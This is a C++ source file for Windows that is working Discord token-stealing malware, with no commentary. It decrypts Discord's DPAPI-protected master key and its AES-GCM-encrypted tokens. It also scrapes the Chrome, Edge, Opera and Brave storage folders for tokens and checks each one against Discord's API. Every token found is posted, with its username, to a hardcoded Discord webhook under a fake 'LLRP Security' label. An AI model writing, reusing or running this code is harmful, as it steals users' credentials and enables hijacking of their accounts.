#include <windows.h>
#include <wincrypt.h>
#include <bcrypt.h>
#include <winhttp.h>
#include <wininet.h>
#include <shlobj.h>
#include <fstream>
#include <regex>
#include <filesystem>
#include <string>
#include <vector>
#pragma comment(lib,"crypt32.lib")
#pragma comment(lib,"bcrypt.lib")
#pragma comment(lib,"winhttp.lib")
#pragma comment(lib,"wininet.lib")
#pragma comment(lib,"shell32.lib")

std::string X(const std::string& s, int k) { std::string r; for (char c : s)r += c ^ k; return r; }
std::wstring W(const std::string& s) { return std::wstring(s.begin(), s.end()); }

class C {
    std::string la, ra;
    std::vector<std::pair<std::string, std::string>> ft;
    std::regex tp{ R"([\w-]{24,26}\.[\w-]{6}\.[\w-]{27,110})" };
    std::string wh = "https://canary.discord.com/api/webhooks/1553115506377097306/krIfRoppmb-AADUME4wnLPjGAQSd578g-X4f55s8vii76yIGez6eyUTuCfGi0QR0NvpL";
    std::string B(const std::string& in) {
        DWORD l = 0;
        CryptStringToBinaryA(in.c_str(), (DWORD)in.length(), CRYPT_STRING_BASE64, nullptr, &l, nullptr, nullptr);
        std::vector<BYTE> o(l);
        CryptStringToBinaryA(in.c_str(), (DWORD)in.length(), CRYPT_STRING_BASE64, o.data(), &l, nullptr, nullptr);
        return std::string((char*)o.data(), l);
    }
    std::vector<BYTE> K(const std::string& p) {
        std::ifstream f(p);
        if (!f.is_open())return{};
        std::string c((std::istreambuf_iterator<char>(f)), std::istreambuf_iterator<char>());
        std::smatch m;
        if (!std::regex_search(c, m, std::regex("\"encrypted_key\":\"(.*?)\"")))return{};
        std::string d = B(m[1].str());
        if (d.substr(0, 5) != "DPAPI")return{};
        DATA_BLOB in, out;
        in.pbData = (BYTE*)d.data() + 5;
        in.cbData = (DWORD)(d.size() - 5);
        if (CryptUnprotectData(&in, nullptr, nullptr, nullptr, nullptr, 0, &out)) {
            std::vector<BYTE> r(out.pbData, out.pbData + out.cbData);
            LocalFree(out.pbData);
            return r;
        }
        return{};
    }
    std::string D(const std::string& e, const std::vector<BYTE>& k) {
        if (e.size() < 31)return"";
        BCRYPT_ALG_HANDLE a = nullptr;
        BCRYPT_KEY_HANDLE h = nullptr;
        NTSTATUS s = BCryptOpenAlgorithmProvider(&a, BCRYPT_AES_ALGORITHM, nullptr, 0);
        if (!BCRYPT_SUCCESS(s))return"";
        s = BCryptSetProperty(a, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
        if (BCRYPT_SUCCESS(s))s = BCryptGenerateSymmetricKey(a, &h, nullptr, 0, (PUCHAR)k.data(), (ULONG)k.size(), 0);
        if (!BCRYPT_SUCCESS(s)) { BCryptCloseAlgorithmProvider(a, 0); return""; }
        BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO i;
        BCRYPT_INIT_AUTH_MODE_INFO(i);
        i.pbNonce = (PUCHAR)&e[3];
        i.cbNonce = 12;
        i.pbTag = (PUCHAR)&e[e.size() - 16];
        i.cbTag = 16;
        DWORD l = 0;
        std::vector<BYTE> d(e.size() - 15 - 16);
        s = BCryptDecrypt(h, (PUCHAR)&e[15], (ULONG)(e.size() - 15 - 16), &i, nullptr, 0, d.data(), (ULONG)d.size(), &l, 0);
        BCryptDestroyKey(h);
        BCryptCloseAlgorithmProvider(a, 0);
        if (BCRYPT_SUCCESS(s))return std::string((char*)d.data(), l);
        return"";
    }
    std::string U(const std::string& t) {
        std::wstring ua = L"Mozilla/5.0";
        std::wstring host = L"discord.com";
        std::wstring path = L"/api/v9/users/@me";
        HINTERNET s = WinHttpOpen(ua.c_str(), WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
        if (!s)return"";
        HINTERNET c = WinHttpConnect(s, host.c_str(), INTERNET_DEFAULT_HTTPS_PORT, 0);
        if (!c) { WinHttpCloseHandle(s); return""; }
        HINTERNET h = WinHttpOpenRequest(c, L"GET", path.c_str(), NULL, NULL, NULL, WINHTTP_FLAG_SECURE);
        if (!h) { WinHttpCloseHandle(c); WinHttpCloseHandle(s); return""; }
        std::wstring ah = L"Authorization: " + std::wstring(t.begin(), t.end());
        WinHttpAddRequestHeaders(h, ah.c_str(), (ULONG)-1L, WINHTTP_ADDREQ_FLAG_ADD);
        if (!WinHttpSendRequest(h, NULL, 0, NULL, 0, 0, 0) || !WinHttpReceiveResponse(h, NULL)) { WinHttpCloseHandle(h); WinHttpCloseHandle(c); WinHttpCloseHandle(s); return""; }
        std::string r; char b[512]; DWORD rd;
        while (WinHttpReadData(h, b, sizeof(b), &rd) && rd > 0)r.append(b, rd);
        WinHttpCloseHandle(h); WinHttpCloseHandle(c); WinHttpCloseHandle(s);
        std::smatch u, d;
        if (std::regex_search(r, u, std::regex("\"username\"\\s*:\\s*\"([^\"]+)\"")) && std::regex_search(r, d, std::regex("\"discriminator\"\\s*:\\s*\"([^\"]+)\"")))
            return u[1].str() + "#" + d[1].str();
        return"";
    }
    bool S(const std::string& t, const std::string& u) {
        HINTERNET i = InternetOpenA(NULL, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
        if (!i)return false;
        URL_COMPONENTSA uc = { sizeof(uc) };
        char hn[256] = { 0 }, p[1024] = { 0 };
        uc.lpszHostName = hn; uc.dwHostNameLength = sizeof(hn);
        uc.lpszUrlPath = p; uc.dwUrlPathLength = sizeof(p);
        if (!InternetCrackUrlA(wh.c_str(), 0, 0, &uc)) { InternetCloseHandle(i); return false; }
        HINTERNET c = InternetConnectA(i, hn, uc.nPort, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
        if (!c) { InternetCloseHandle(i); return false; }
        HINTERNET h = HttpOpenRequestA(c, "POST", p, NULL, NULL, NULL, INTERNET_FLAG_SECURE | INTERNET_FLAG_NO_CACHE_WRITE, 0);
        if (!h) { InternetCloseHandle(c); InternetCloseHandle(i); return false; }
        std::string pl = "{\"embeds\":[{\"title\":\"**" + u + "**\",\"fields\":[{\"name\":\"Item Details\",\"value\":\"||```" + t + "```||\"}],\"footer\":{\"text\":\"LLRP Security\"}}]}";
        std::string hd = "Content-Type: application/json\r\n";
        BOOL se = HttpSendRequestA(h, hd.c_str(), (DWORD)-1, (LPVOID)pl.c_str(), (DWORD)pl.size());
        InternetCloseHandle(h); InternetCloseHandle(c); InternetCloseHandle(i);
        return se == TRUE;
    }
public:
    C() {
        char lp[MAX_PATH], rp[MAX_PATH];
        SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, lp);
        SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, rp);
        la = lp; ra = rp;
    }
    void E() {
        for (auto a : { "discord","discordcanary","discordptb" }) {
            std::string bp = ra + "\\" + a + "\\", ldb = bp + "Local Storage\\leveldb\\", sp = bp + "Local State";
            if (!std::filesystem::exists(ldb) || !std::filesystem::exists(sp))continue;
            auto mk = K(sp);
            if (mk.empty())continue;
            for (auto& e : std::filesystem::directory_iterator(ldb)) {
                std::ifstream f(e.path(), std::ios::binary);
                if (!f.is_open())continue;
                std::string c((std::istreambuf_iterator<char>(f)), std::istreambuf_iterator<char>());
                std::smatch m;
                auto it = c.cbegin();
                while (std::regex_search(it, c.cend(), m, std::regex("dQw4w9WgXcQ:([^\"]+)"))) {
                    std::string d = D(B(m[1].str()), mk);
                    if (!d.empty()) {
                        bool ex = false;
                        for (auto& pr : ft)if (pr.first == d) { ex = true; break; }
                        if (!ex) {
                            std::string un = U(d);
                            if (!un.empty())ft.emplace_back(d, un);
                        }
                    }
                    it = m.suffix().first;
                }
            }
        }
        std::vector<std::pair<std::string, std::string>> br = {
            {"Chrome",la + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\"},
            {"Opera",ra + "\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\"},
            {"Opera GX",ra + "\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\"},
            {"Edge",la + "\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\"},
            {"Brave",la + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\"}
        };
        for (auto& b : br) {
            if (!std::filesystem::exists(b.second))continue;
            for (auto& e : std::filesystem::directory_iterator(b.second)) {
                std::string fn = e.path().filename().string();
                if (fn.find(".log") == std::string::npos && fn.find(".ldb") == std::string::npos)continue;
                std::ifstream f(e.path(), std::ios::binary);
                if (!f.is_open())continue;
                std::string c((std::istreambuf_iterator<char>(f)), std::istreambuf_iterator<char>());
                std::smatch m;
                auto it = c.cbegin();
                while (std::regex_search(it, c.cend(), m, tp)) {
                    std::string tk = m.str(0);
                    bool ex = false;
                    for (auto& pr : ft)if (pr.first == tk) { ex = true; break; }
                    if (!ex) {
                        std::string un = U(tk);
                        if (!un.empty())ft.emplace_back(tk, un);
                    }
                    it = m.suffix().first;
                }
            }
        }
    }
    void T() { for (auto& pr : ft)S(pr.first, pr.second); }
};

